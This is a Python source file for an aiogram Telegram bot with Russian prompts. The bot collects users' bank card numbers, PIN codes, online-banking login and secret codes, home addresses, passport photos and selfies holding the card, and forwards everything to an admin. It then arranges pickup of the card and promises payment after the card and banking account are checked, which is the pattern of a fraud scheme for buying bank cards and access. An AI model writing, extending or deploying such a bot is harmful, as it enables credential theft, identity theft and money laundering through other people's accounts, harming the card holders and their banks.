import logging
import os
from dataclasses import dataclass, asdict

from aiogram import Bot, Dispatcher, F
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.base import StorageKey
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
    User
)

# Импорт конфигурации
try:
    from config import BOT_TOKEN as CONFIG_BOT_TOKEN, ADMIN_ID as CONFIG_ADMIN_ID
except ImportError:
    CONFIG_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
    CONFIG_ADMIN_ID = 0
    logging.warning("config.py не найден. Используйте переменные окружения или создайте config.py")


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger(__name__)


# =============================
# CONFIG
# =============================
# Приоритет: переменные окружения > config.py

BOT_TOKEN = os.getenv("BOT_TOKEN", CONFIG_BOT_TOKEN)

try:
    ADMIN_ID = int(os.getenv("ADMIN_ID", str(CONFIG_ADMIN_ID)))
except ValueError:
    ADMIN_ID = CONFIG_ADMIN_ID

if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or not BOT_TOKEN:
    logger.error(
        "BOT_TOKEN не установлен! "
        "Установите BOT_TOKEN в config.py или через переменную окружения BOT_TOKEN"
    )

if not ADMIN_ID:
    logger.error(
        "ADMIN_ID не установлен! "
        "Установите ADMIN_ID в config.py или через переменную окружения ADMIN_ID"
    )


# =============================
# DATA MODELS & STATES
# =============================


@dataclass
class Questionnaire:
    form: str | None = None
    passport_photos: list[str] | None = None  # file_ids
    selfie_file_id: str | None = None
    selfie_type: str | None = None  # 'photo', 'video', 'video_note'


class QuestionnaireStates(StatesGroup):
    waiting_form = State()
    waiting_passport_photos = State()
    waiting_selfie = State()
    waiting_pickup_info = State()
    admin_dialog = State()  # Состояние для диалога с админом
    admin_replying = State()  # Админ отвечает пользователю


# =============================
# HELPERS
# =============================


def build_admin_approval_keyboard(user_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="✅ Одобрить",
                    callback_data=f"approve:{user_id}",
                ),
                InlineKeyboardButton(
                    text="❌ Отклонить",
                    callback_data=f"reject:{user_id}",
                ),
            ]
        ]
    )


def build_contact_admin_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="📞 Связаться с администратором",
                    callback_data="contact_admin",
                ),
            ]
        ]
    )


def build_reply_to_user_keyboard(user_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="✉️ Ответить пользователю",
                    callback_data=f"reply_to_user:{user_id}",
                ),
            ]
        ]
    )


def format_questionnaire_text(user: User, q: Questionnaire) -> str:    # user: actually aiogram.types.User, but we only need id / username / full_name
    lines = [
        "<b>Новая анкета</b>",
        "",
        f"<b>Telegram ID:</b> <code>{user.id}</code>",
    ]
    if user.username:
        lines.append(f"<b>Username:</b> @{user.username}")
    if user.full_name:
        lines.append(f"<b>Telegram имя:</b> {user.full_name}")

    lines.extend(
        [
            "",
            f"{q.form}"
        ]
    )

    disclaimer = (
        "\n\n<b>Дисклеймер:</b> для оперативной связи нужны актуальные данные, "
        "для связи и доставки. Пожалуйста, уточните все данные в анкете."
    )

    lines.append(disclaimer)
    return "\n".join(lines)


# =============================
# HANDLERS
# =============================


async def cmd_start(message: Message, state: FSMContext) -> None:
    await state.clear()
    text = (
        "Здравствуйте!\n\n"
        "Я бот для заполнения анкеты.\n\n"
        "⚠️ <b>Важно:</b> для оперативной связи нужны актуальные данные, "
        "для связи и доставки. Пожалуйста, уточните все данные в анкете.\n\n"
        "Давайте начнём с анкеты. Можете полностью скопировать сообщение и вставить свои данные в поле\n\n"
    )
    await message.answer(text, parse_mode=ParseMode.HTML)
    text = (
        "<b>1. ФИО - </b>\n"
        "<b>2. Основной номер телефона - </b>\n"
        "<b>3. Дополнительный контактный телефон (Если нет — напишите «нет») - </b>\n"
        "<b>4. Город фактического проживания - </b>\n"
        "<b>5. Номер карты - </b>\n"
        "<b>6. ПИН-код - </b>\n"
        "<b>7. Код от Личного Кабинета - </b>\n"
        "<b>8. Секретный код - </b>\n"
        "<b>9. Полный адрес фактического проживания </b> (улица, дом, подъезд, этаж, квартира) - \n"
    )
    await message.answer(text, parse_mode=ParseMode.HTML)
    await state.set_state(QuestionnaireStates.waiting_form)

async def process_form(message: Message, state: FSMContext) -> None:
    form = message.text.strip()
    data = await state.get_data()
    q_dict = data.get("questionnaire", {})
    q_dict["form"] = form
    await state.update_data(questionnaire=q_dict)
    await message.answer(
        "<b>10.</b> Пришлите <b>фото паспорта</b> (страница с фото и пропиской) "
        "в хорошем качестве. Можно несколькими фото.",
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(QuestionnaireStates.waiting_passport_photos)


async def process_passport_photos(message: Message, state: FSMContext) -> None:
    if not message.photo:
        await message.answer(
            "Пожалуйста, отправьте именно <b>фото</b> паспорта.",
            parse_mode=ParseMode.HTML,
        )
        return

    data = await state.get_data()
    q_dict = data.get("questionnaire", {})

    photos: list[str] = q_dict.get("passport_photos") or []
    file_id = message.photo[-1].file_id  # best quality
    photos.append(file_id)
    q_dict["passport_photos"] = photos
    await state.update_data(questionnaire=q_dict)

    await message.answer(
        "Фото паспорта сохранено.\n\n"
        "Если нужно, отправьте ещё фото. Когда закончите, напишите «готово».",
        parse_mode=ParseMode.HTML,
    )

async def finish_passport_photos(message: Message, state: FSMContext) -> None:
    data = await state.get_data()
    q_dict = data.get("questionnaire", {})
    photos = q_dict.get("passport_photos") or []

    if not photos:
        await message.answer(
            "У вас пока нет сохранённых фото паспорта. "
            "Пожалуйста, отправьте хотя бы одно фото.",
            parse_mode=ParseMode.HTML,
        )
        return

    await message.answer(
        "Спасибо! Фото паспорта сохранены.",
        parse_mode=ParseMode.HTML,
    )

    await state.set_state(QuestionnaireStates.waiting_selfie)

    await message.answer(
        "Теперь пришлите, пожалуйста, "
        "<b>селфи или видеосообщение</b> с материалом и паспортом "
        "в хорошем качестве.",
        parse_mode=ParseMode.HTML,
    )


async def process_selfie(message: Message, state: FSMContext) -> None:
    if not (message.photo or message.video or message.video_note):
        await message.answer(
            "Пожалуйста, отправьте фото или видео.",
            parse_mode=ParseMode.HTML,
        )
        return

    # Сохраняем селфи в анкету
    data = await state.get_data()
    q_dict = data.get("questionnaire", {})
    
    if message.photo:
        q_dict["selfie_file_id"] = message.photo[-1].file_id
        q_dict["selfie_type"] = "photo"
    elif message.video:
        q_dict["selfie_file_id"] = message.video.file_id
        q_dict["selfie_type"] = "video"
    elif message.video_note:
        q_dict["selfie_file_id"] = message.video_note.file_id
        q_dict["selfie_type"] = "video_note"
    
    await state.update_data(questionnaire=q_dict)

    # Теперь отправляем всю анкету админу
    if ADMIN_ID:
        q = Questionnaire(**q_dict)
        text = format_questionnaire_text(message.from_user, q)
        try:
            # Отправляем текст анкеты
            await message.bot.send_message(
                chat_id=ADMIN_ID,
                text=text,
                parse_mode=ParseMode.HTML,
                reply_markup=build_admin_approval_keyboard(message.from_user.id),
            )
            # Отправляем фото паспорта
            photos = q_dict.get("passport_photos") or []
            for file_id in photos:
                await message.bot.send_photo(
                    chat_id=ADMIN_ID,
                    photo=file_id,
                    caption=f"Паспорт, пользователь {message.from_user.id}",
                )
            
            # Отправляем селфи/материал
            if message.photo:
                await message.bot.send_photo(
                    chat_id=ADMIN_ID,
                    photo=message.photo[-1].file_id,
                    caption=f"Селфи/материал от пользователя {message.from_user.id}",
                )
            elif message.video:
                await message.bot.send_video(
                    chat_id=ADMIN_ID,
                    video=message.video.file_id,
                    caption=f"Видео от пользователя {message.from_user.id}",
                )
            elif message.video_note:
                await message.bot.send_video_note(
                    chat_id=ADMIN_ID,
                    video_note=message.video_note.file_id,
                )
                await message.bot.send_message(
                    chat_id=ADMIN_ID,
                    text=f"Видеосообщение от пользователя {message.from_user.id}",
                )
        except Exception as e:
            logger.exception("Failed to send questionnaire to admin: %s", e)

    await message.answer(
        "Спасибо! Материалы получены.\n\n"
        "<b>Анкета отправлена на проверку, пожалуйста, ожидайте решения администратора.</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=build_contact_admin_keyboard(),
    )
    
    await state.clear()


# ===== ADMIN CALLBACKS =====


async def admin_approve_callback(callback: CallbackQuery, state: FSMContext, bot: Bot) -> None:
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("Недостаточно прав.", show_alert=True)
        return

    _, user_id_str = callback.data.split(":", maxsplit=1)
    user_id = int(user_id_str)

    await callback.answer("Анкета одобрена.")
    
    # Удаляем кнопки после принятия решения
    try:
        await callback.message.edit_reply_markup(reply_markup=None)
    except Exception as e:
        logger.exception("Failed to remove keyboard: %s", e)

    # Сообщение продавцу
    await bot.send_message(
        chat_id=user_id,
        text=(
            "Ваша анкета <b>одобрена</b> ✅\n\n"
            "Укажите, пожалуйста, <b>адрес</b>, откуда удобнее всего отправить материал, "
            "и <b>в какое время</b> это будет удобно сделать."
        ),
        parse_mode=ParseMode.HTML,
        reply_markup=build_contact_admin_keyboard(),
    )

    # Установим состояние этому пользователю
    # В этом простом примере мы используем MemoryStorage, поэтому создадим отдельный FSMContext
    user_state = FSMContext(
        storage=callback.message.bot.dispatcher.storage,  # type: ignore[attr-defined]
        key=(
            callback.message.chat.id,
            user_id,
        ),
    )
    await user_state.set_state(QuestionnaireStates.waiting_pickup_info)


async def admin_reject_callback(callback: CallbackQuery, bot: Bot) -> None:
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("Недостаточно прав.", show_alert=True)
        return

    _, user_id_str = callback.data.split(":", maxsplit=1)
    user_id = int(user_id_str)

    await callback.answer("Анкета отклонена.")
    
    # Удаляем кнопки после принятия решения
    try:
        await callback.message.edit_reply_markup(reply_markup=None)
    except Exception as e:
        logger.exception("Failed to remove keyboard: %s", e)

    await bot.send_message(
        chat_id=user_id,
        text=(
            "К сожалению, ваша анкета отклонена. ❌\n\n"
            "Для уточнений свяжитесь с администратором."
        ),
        parse_mode=ParseMode.HTML,
        reply_markup=build_contact_admin_keyboard(),
    )


async def process_pickup_info(message: Message, state: FSMContext) -> None:
    pickup_info = message.text.strip()

    # Отправляем админу
    if ADMIN_ID:
        try:
            await message.bot.send_message(
                chat_id=ADMIN_ID,
                text=(
                    "<b>Адрес и время отправки материала от продавца</b>\n\n"
                    f"<b>Пользователь:</b> <code>{message.from_user.id}</code>\n"
                    f"<b>Информация:</b> {pickup_info}"
                ),
                parse_mode=ParseMode.HTML,
            )
        except Exception as e:
            logger.exception("Failed to send pickup info to admin: %s", e)

    await message.answer(
        "Спасибо! Информация передана администратору. "
        "Ожидайте дальнейшие инструкции.\n\n"
        "💸 Оплата происходит строго после проверки карты и личного кабинета.",
        parse_mode=ParseMode.HTML,
        reply_markup=build_contact_admin_keyboard(),
    )

    await state.clear()


# ===== ADMIN DIALOG =====


async def contact_admin_callback(callback: CallbackQuery, state: FSMContext) -> None:
    """Обработка нажатия кнопки связи с админом"""
    await callback.answer()
    
    await callback.message.answer(
        "Вы можете отправить сообщение администратору.\n"
        "Напишите ваш вопрос или сообщение, и оно будет передано администратору.\n\n"
        "Для отмены отправьте /start",
        parse_mode=ParseMode.HTML,
    )
    
    await state.set_state(QuestionnaireStates.admin_dialog)


async def handle_user_message_to_admin(message: Message, state: FSMContext) -> None:
    """Пересылка сообщения от пользователя админу"""
    if ADMIN_ID:
        try:
            user_info = f"<b>Сообщение от пользователя {message.from_user.id}</b>"
            if message.from_user.username:
                user_info += f" (@{message.from_user.username})"
            user_info += ":\n\n"
            
            # Сохраняем ID пользователя для ответа
            await state.update_data(user_id_for_reply=message.from_user.id)
            
            if message.text:
                await message.bot.send_message(
                    chat_id=ADMIN_ID,
                    text=user_info + message.text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=build_reply_to_user_keyboard(message.from_user.id),
                )
            elif message.photo:
                await message.bot.send_photo(
                    chat_id=ADMIN_ID,
                    photo=message.photo[-1].file_id,
                    caption=user_info + (message.caption or ""),
                    parse_mode=ParseMode.HTML,
                    reply_markup=build_reply_to_user_keyboard(message.from_user.id),
                )
            elif message.video:
                await message.bot.send_video(
                    chat_id=ADMIN_ID,
                    video=message.video.file_id,
                    caption=user_info + (message.caption or ""),
                    parse_mode=ParseMode.HTML,
                    reply_markup=build_reply_to_user_keyboard(message.from_user.id),
                )
            elif message.document:
                await message.bot.send_document(
                    chat_id=ADMIN_ID,
                    document=message.document.file_id,
                    caption=user_info + (message.caption or ""),
                    parse_mode=ParseMode.HTML,
                    reply_markup=build_reply_to_user_keyboard(message.from_user.id),
                )
            elif message.voice:
                await message.bot.send_voice(
                    chat_id=ADMIN_ID,
                    voice=message.voice.file_id,
                    caption=user_info,
                    parse_mode=ParseMode.HTML,
                    reply_markup=build_reply_to_user_keyboard(message.from_user.id),
                )
            elif message.video_note:
                await message.bot.send_video_note(
                    chat_id=ADMIN_ID,
                    video_note=message.video_note.file_id,
                )
                await message.bot.send_message(
                    chat_id=ADMIN_ID,
                    text=user_info,
                    parse_mode=ParseMode.HTML,
                    reply_markup=build_reply_to_user_keyboard(message.from_user.id),
                )
            
            await message.answer(
                "Ваше сообщение отправлено администратору. Ожидайте ответа.",
                parse_mode=ParseMode.HTML,
            )
        except Exception as e:
            logger.exception("Failed to forward message to admin: %s", e)
            await message.answer(
                "Произошла ошибка при отправке сообщения. Попробуйте позже.",
                parse_mode=ParseMode.HTML,
            )


async def handle_admin_reply(message: Message, state: FSMContext) -> None:
    """Обработка ответа админа пользователю через reply"""
    if message.from_user.id != ADMIN_ID:
        return
    
    # Проверяем, является ли это ответом на сообщение
    if not message.reply_to_message:
        return
    
    # Извлекаем ID пользователя из текста сообщения, на которое отвечают
    replied_text = message.reply_to_message.text or message.reply_to_message.caption or ""
    
    # Ищем ID пользователя в формате "Сообщение от пользователя 123456789"
    import re
    match = re.search(r"пользователя (\d+)", replied_text)
    
    if not match:
        # Также проверяем другие форматы
        match = re.search(r"<code>(\d+)</code>", replied_text)
    
    if match:
        user_id = int(match.group(1))
        
        try:
            admin_reply = "<b>Ответ от администратора:</b>\n\n"
            
            if message.text:
                await message.bot.send_message(
                    chat_id=user_id,
                    text=admin_reply + message.text,
                    parse_mode=ParseMode.HTML,
                )
            elif message.photo:
                await message.bot.send_photo(
                    chat_id=user_id,
                    photo=message.photo[-1].file_id,
                    caption=admin_reply + (message.caption or ""),
                    parse_mode=ParseMode.HTML,
                )
            elif message.video:
                await message.bot.send_video(
                    chat_id=user_id,
                    video=message.video.file_id,
                    caption=admin_reply + (message.caption or ""),
                    parse_mode=ParseMode.HTML,
                )
            elif message.document:
                await message.bot.send_document(
                    chat_id=user_id,
                    document=message.document.file_id,
                    caption=admin_reply + (message.caption or ""),
                    parse_mode=ParseMode.HTML,
                )
            elif message.voice:
                await message.bot.send_voice(
                    chat_id=user_id,
                    voice=message.voice.file_id,
                    caption=admin_reply,
                    parse_mode=ParseMode.HTML,
                )
            elif message.video_note:
                await message.bot.send_message(
                    chat_id=user_id,
                    text=admin_reply,
                    parse_mode=ParseMode.HTML,
                )
                await message.bot.send_video_note(
                    chat_id=user_id,
                    video_note=message.video_note.file_id,
                )
            
            await message.reply(f"✅ Сообщение отправлено пользователю {user_id}")
        except Exception as e:
            logger.exception("Failed to send reply to user: %s", e)
            await message.reply(f"❌ Не удалось отправить сообщение пользователю {user_id}")


async def reply_to_user_callback(callback: CallbackQuery, state: FSMContext) -> None:
    """Обработка нажатия кнопки ответа пользователю"""
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("Недостаточно прав.", show_alert=True)
        return
    
    _, user_id_str = callback.data.split(":", maxsplit=1)
    user_id = int(user_id_str)
    
    await callback.answer()
    
    # Создаём FSMContext для админа
    admin_state = FSMContext(
        storage=callback.message.bot.dispatcher.storage,  # type: ignore[attr-defined]
        key=StorageKey(
            chat_id=callback.message.chat.id,  # Чат админа
            user_id=ADMIN_ID,  # ID админа
            bot_id=callback.message.bot.id,  # ID бота
        ),
    )
    
    # Сохраняем ID пользователя и устанавливаем состояние
    await admin_state.update_data(replying_to_user_id=user_id)
    await admin_state.set_state(QuestionnaireStates.admin_replying)
    
    await callback.message.answer(
        f"Вы в режиме ответа пользователю <code>{user_id}</code>.\n"
        "Напишите сообщение, которое хотите отправить.\n\n"
        "Для отмены отправьте /cancel",
        parse_mode=ParseMode.HTML,
    )


async def handle_admin_reply_message(message: Message, state: FSMContext) -> None:
    """Обработка сообщения от админа для отправки пользователю"""
    logger.info(f"handle_admin_reply_message called from user {message.from_user.id}")
    
    if message.from_user.id != ADMIN_ID:
        logger.warning(f"Non-admin user {message.from_user.id} tried to use admin reply handler")
        return
    
    if message.text and message.text.strip() == "/cancel":
        await state.clear()
        await message.answer("Отменено.")
        return
    
    data = await state.get_data()
    logger.info(f"State data: {data}")
    user_id = data.get("replying_to_user_id")
    
    if not user_id:
        await message.answer("Ошибка: не указан ID пользователя.")
        await state.clear()
        return
    
    try:
        admin_reply = "<b>Ответ от администратора:</b>\n\n"
        
        if message.text:
            await message.bot.send_message(
                chat_id=user_id,
                text=admin_reply + message.text,
                parse_mode=ParseMode.HTML,
            )
        elif message.photo:
            await message.bot.send_photo(
                chat_id=user_id,
                photo=message.photo[-1].file_id,
                caption=admin_reply + (message.caption or ""),
                parse_mode=ParseMode.HTML,
            )
        elif message.video:
            await message.bot.send_video(
                chat_id=user_id,
                video=message.video.file_id,
                caption=admin_reply + (message.caption or ""),
                parse_mode=ParseMode.HTML,
            )
        elif message.document:
            await message.bot.send_document(
                chat_id=user_id,
                document=message.document.file_id,
                caption=admin_reply + (message.caption or ""),
                parse_mode=ParseMode.HTML,
            )
        elif message.voice:
            await message.bot.send_voice(
                chat_id=user_id,
                voice=message.voice.file_id,
                caption=admin_reply,
                parse_mode=ParseMode.HTML,
            )
        elif message.video_note:
            await message.bot.send_message(
                chat_id=user_id,
                text=admin_reply,
                parse_mode=ParseMode.HTML,
            )
            await message.bot.send_video_note(
                chat_id=user_id,
                video_note=message.video_note.file_id,
            )
        
        await message.answer(f"✅ Сообщение отправлено пользователю {user_id}")
        await state.clear()
    except Exception as e:
        logger.exception("Failed to send reply to user: %s", e)
        await message.answer(f"❌ Не удалось отправить сообщение пользователю {user_id}")
        await state.clear()


# =============================
# APP SETUP
# =============================


def setup_handlers(dp: Dispatcher) -> None:
    dp.message.register(cmd_start, CommandStart())

    dp.message.register(process_form, QuestionnaireStates.waiting_form)

    dp.message.register(
        process_passport_photos,
        QuestionnaireStates.waiting_passport_photos,
        F.photo,
    )
    dp.message.register(
        finish_passport_photos,
        QuestionnaireStates.waiting_passport_photos,
        F.text.casefold() == "готово",
    )

    dp.message.register(
        process_selfie,
        QuestionnaireStates.waiting_selfie,
    )

    dp.callback_query.register(
        admin_approve_callback,
        F.data.startswith("approve:"),
    )
    dp.callback_query.register(
        admin_reject_callback,
        F.data.startswith("reject:"),
    )
    dp.callback_query.register(
        contact_admin_callback,
        F.data == "contact_admin",
    )
    dp.callback_query.register(
        reply_to_user_callback,
        F.data.startswith("reply_to_user:"),
    )

    dp.message.register(
        process_pickup_info,
        QuestionnaireStates.waiting_pickup_info,
    )
    
    # Обработчик для диалога с админом
    dp.message.register(
        handle_user_message_to_admin,
        QuestionnaireStates.admin_dialog,
    )
    
    # Обработчик ответов админа через кнопку
    dp.message.register(
        handle_admin_reply_message,
        QuestionnaireStates.admin_replying,
        F.from_user.id == ADMIN_ID,
    )
    
    # Обработчик ответов админа через reply (должен быть последним, чтобы не перехватывать другие сообщения)
    dp.message.register(
        handle_admin_reply,
        F.reply_to_message,
        F.from_user.id == ADMIN_ID,
    )


async def main() -> None:
    bot = Bot(BOT_TOKEN, parse_mode=ParseMode.HTML)
    storage = MemoryStorage()
    dp = Dispatcher(storage=storage)

    # Save dispatcher on bot object for later access (hack for admin callbacks)
    bot.dispatcher = dp  # type: ignore[attr-defined]

    setup_handlers(dp)

    logger.info("Bot started")
    await dp.start_polling(bot)


if __name__ == "__main__":
    import asyncio

    asyncio.run(main())

